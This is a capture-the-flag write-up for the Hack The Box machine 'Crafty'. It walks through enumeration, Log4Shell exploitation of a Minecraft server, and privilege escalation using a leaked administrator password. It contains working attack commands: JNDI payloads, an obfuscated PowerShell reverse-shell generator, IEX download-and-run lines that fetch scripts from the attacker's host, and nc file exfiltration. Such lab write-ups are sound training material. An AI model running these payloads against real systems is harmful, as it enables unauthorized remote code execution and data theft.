---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Crafty

## Enumeration

### Nmap

```
└─$ nmap -p- -sV -sC 10.10.11.249 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-16 12:27 CET
Nmap scan report for 10.10.11.249
Host is up (0.054s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://crafty.htb
|_http-server-header: Microsoft-IIS/10.0
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 1/100)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 241.74 seconds
```

Minecraft? That is interesting... However, first let's check the web first.

## Web (80)

A simple webpage advertising minecreft server. There is noting more to it.

However, there is a hint towards `play.crafty.htb`

### Subfolders

<details> <summary>Feroxbuser</summary>

```
└─$ feroxbuster -u http://crafty.htb/ -r --insecure

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher                    ver: 2.10.1
───────────────────────────┬──────────────────────
     Target Url            │ http://crafty.htb/
     Threads               │ 50
     Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
     Status Codes          │ All Status Codes!
     Timeout (secs)        │ 7
     User-Agent            │ feroxbuster/2.10.1
     Config File           │ /etc/feroxbuster/ferox-config.toml
     Extract Links         │ true
     HTTP methods          │ [GET]
     Insecure              │ true
     Follow Redirects      │ true
     Recursion Depth       │ 4
───────────────────────────┴──────────────────────
   Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l       12w     2799c http://crafty.htb/js/firefly.js
200      GET       35l       98w     1206c http://crafty.htb/coming-soon
200      GET      224l      434w     3585c http://crafty.htb/css/stylesheet.css
200      GET       77l      234w     2159c http://crafty.htb/js/main.js
403      GET       29l       92w     1233c http://crafty.htb/img/
200      GET      131l      814w    68917c http://crafty.htb/img/forums.png
200      GET      102l      488w    43575c http://crafty.htb/img/logo.png
200      GET      105l      560w    43365c http://crafty.htb/img/vote.png
403      GET       29l       92w     1233c http://crafty.htb/js/
403      GET       29l       92w     1233c http://crafty.htb/css/
200      GET       58l      150w     1826c http://crafty.htb/home
200      GET      204l     1117w    83278c http://crafty.htb/img/store.png
200      GET       43l      330w   179869c http://crafty.htb/img/favicon.ico
200      GET       58l      150w     1826c http://crafty.htb/
403      GET       29l       92w     1233c http://crafty.htb/CSS/
200      GET       58l      150w     1826c http://crafty.htb/Home
403      GET       29l       92w     1233c http://crafty.htb/JS/
403      GET       29l       92w     1233c http://crafty.htb/Js/
403      GET       29l       92w     1233c http://crafty.htb/Css/
403      GET       29l       92w     1233c http://crafty.htb/IMG/
403      GET       29l       92w     1233c http://crafty.htb/Img/
200      GET       58l      150w     1826c http://crafty.htb/HOME
200      GET      173l     1379w    80723c http://crafty.htb/img/coming-soon.png
404      GET        0l        0w     1245c http://crafty.htb/IMG/Alerts
400      GET        6l       26w      324c http://crafty.htb/error%1F_log
400      GET        6l       26w      324c http://crafty.htb/css/error%1F_log
400      GET        6l       26w      324c http://crafty.htb/img/error%1F_log
400      GET        6l       26w      324c http://crafty.htb/js/error%1F_log
400      GET        6l       26w      324c http://crafty.htb/CSS/error%1F_log
400      GET        6l       26w      324c http://crafty.htb/JS/error%1F_log
400      GET        6l       26w      324c http://crafty.htb/Js/error%1F_log
400      GET        6l       26w      324c http://crafty.htb/Css/error%1F_log
404      GET        0l        0w     1245c http://crafty.htb/js/inclu
400      GET        6l       26w      324c http://crafty.htb/IMG/error%1F_log
400      GET        6l       26w      324c http://crafty.htb/Img/error%1F_log
```

</details> Really, nothing interesting here...

## Minecraft Server (25565)

We know version from nmap: `1.16.5` After some googling, the version is vulnerable to log4shell! https://github.com/davidbombal/log4jminecraft All it takes is to send the `{jndi:LDAP_PAYLOAD_URL}` to chat and that's it. **However! If you would use the POC from the repository, you would break the server!** This is (probbably) due to the Java version mismach. Really nice for shared HTB instance (hence the low score).

### Exploiting Minecraft Log4Shell

Let's use a more generic log4shell tool. https://github.com/pimps/JNDI-Exploit-Kit is a nice one.

Build it with:

```
git clone https://github.com/pimps/JNDI-Exploit-Kit
cd JNDI-Exploit-Kit
mvn clean package -DskipTests
```

And run it with

```
java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -C "powershell.exe -E <PAYLOAD>"
```

It is nice, as it creates all the needed listeners, and exposes many payloads to use. As we know that there is an issue with the version, let's go for payload generated for JDK 1.8: E.g., `ldap://10.10.14.41:1389/bvveib` (url is generated on fly). It execuses payload supplied in `-C` arg. You can try others, and check what the exception tells you and observe the differences. E.g., `CommonsCollections1` throws `com.nqzero.permit.Permit$InitializationFailed` which is recoverable. But, `CommonsCollections2` throws, `java.lang.IllegalAccessError` crashing the server, requiring rebooting the Box.

### Payload

But you need to generate the RCE payload. Remember, it is a windows machine. For example take the reverse shell from `nishang` package (copied below). Namely from the file `/usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1`, that can be found on Kali. It is worse than the one from `powercat` but works here, an is allowed in OSCP, so that's taht.

To generate the payload, execute the following script:

```
TEMPLATE='TEMPLATE HERE'

LHOST=`ip a show dev tun0 | awk '/inet / { print $2}' | sed 's/\/.*//'` # our IP address in lab's VPN 

LPORT=4444

PS_CODE=`echo $TEMPLATE | sed "s/LHOST/$LHOST/; s/LPORT/$LPORT/" | iconv -t UTF-16LE | base64 -w 0`

echo "powershell -enc $PS_CODE"
```

The template needs to be obfuscated, as OneDrive keeps complaining about reverse shells.

the result of the script must be passed to `-C` argument.

Ok, fire-up the listener `nc -lvnp 443`

```
```

And send `${jndi:ldap://10.10.14.41:1389/bvveib}` to chat. But how?

### Minecraft Client

While you can just download normal Minecraft client, you can also use something else. E.g., a console clinet https://mccteam.github.io/, which can be run in docker.

To build the image:

```
git clone https://github.com/MCCTeam/Minecraft-Console-Client.git --recursive
cd Minecraft-Console-Client/Docker 
sudo docker build -t minecraft-console-client:latest .
```

Now, configure it with ini file. Create a folder containg the file. `mcc-data/MinecraftClient.ini`:

```
[Main]
[Main.General]
Account = { Login = "123456", Password = "-" } # Login=Email or Name. Use "-" as password for offline mode. Leave blank to prompt user on startup.
Server = { Host = "10.10.11.249", Port = 25565 }
```

And run it:

```
sudo docker run -it -v /home/razz/Crafty/mcc-data:/opt/data minecraft-console-client:latest
```

Now execute it

```
/send ${jndi:ldap://10.10.14.41:1389/bvveib}
```

And I'm in! Grab the flag.

## Road to Root

What now?

### Upgrade the shell

First, I need to upgrade the shell. To do that, I use `ConPyShell` Download and host

```
wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1
python3 -m http.server 80
```

On attacker:

```
stty size
nc -lvnp 3001
Wait For connection
ctrl+z
stty raw -echo; fg[ENTER]
```

Now I execute the payload in my poor man's shell. Sometimes it might not catch. It that hapens, restart the shell and run it as a first command.

```
IEX(IWR 10.10.14.41/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 10.10.14.41 -RemotePort 4444 -Rows 59 -Cols 236
```

### Jar

After some enumeration, there is an interesing minecraft plugin that has a different timestamp than the server. Let's exfiltrate it using `nc.exe`:

```
# In Attacker
nc -lvp 7777 > file
# In Victim
cmd /c 'nc.exe 10.10.14.41 7777 -w 5 < file'
```

To look what is in there, call:

```
jar -tf playercounter-1.0-SNAPSHOT.jar
```

Ok, based on the package path, it is some custom code. Let's decompile it using `quiltflower`.

```
wget https://github.com/QuiltMC/quiltflower/releases/download/1.8.1/quiltflower-1.8.1.jar  
mkdir source  
java -jar quiltflower-1.8.1.jar -dgs=1 playercounter-1.0-SNAPSHOT.jar source
```

And really, there is something interesting in `htb/crafty/playercounter/Playercounter.java`

```
public final class Playercounter extends JavaPlugin {
   public void onEnable() {
      Rcon rcon = null;

      try {
         rcon = new Rcon("127.0.0.1", 27015, "s67u84zKq8IXw".getBytes());
      } catch (IOException var5) {
         throw new RuntimeException(var5);
      } catch (AuthenticationException var6) {
         throw new RuntimeException(var6);
      }

      String result = null;

      try {
         result = rcon.command("players online count");
         PrintWriter writer = new PrintWriter("C:\\inetpub\\wwwroot\\playercount.txt", "UTF-8");
         writer.println(result);
      } catch (IOException var4) {
         throw new RuntimeException(var4);
      }
   }

   public void onDisable() {
   }
}
```

There is a password and using that it writes to `wwwroot` so that must belong to administrator.

### RunAs

Now, having the password, we need to run the shell as administrator. But that is not simple as in linux. This is an interesting reading about it: https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/lateral-movement/runas

Anyhow, `RunasCs` worked for me. https://github.com/antonioCoco/RunasCs/

Download and host:

```
wget https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1
python3 -m http.server 80
```

Start listener

```
nc -lvnp 443
```

Let's try it:

```
# Load the script first
IEX(IWR 10.10.14.41/Invoke-RunasCs.ps1 -UseBasicParsing)
# Run it
Invoke-RunasCs -Username administrator -Password s67u84zKq8IXw -Command "whoami"

crafty\administrator
```

Nice! Now for the real shell..

Setup a lisener

```
nc -lvnp 443
```

And execute.

```
Invoke-RunasCs -Username administrator -Password s67u84zKq8IXw -Command powershell.exe -Remote 10.10.14.41:443
```

Now grab the flag and close this machine for good.